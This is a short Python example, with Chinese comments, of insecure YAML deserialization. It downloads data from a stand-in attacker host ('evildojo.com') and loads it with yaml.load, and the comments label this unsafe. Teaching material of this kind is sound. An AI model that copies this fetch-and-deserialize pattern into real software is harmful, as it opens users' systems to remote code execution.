import yaml
import urllib.request

# 从不安全的 URL 获取 YAML 数据
url = "https://evildojo.com/malicious_yaml"
response = urllib.request.urlopen(url)

# 使用 yaml.load 反序列化（不安全示例）
malicious_data = yaml.load(response, Loader=yaml.FullLoader)  # 不安全，可能执行恶意代码

# 打印加载后的内容
print(malicious_data)
response.close()
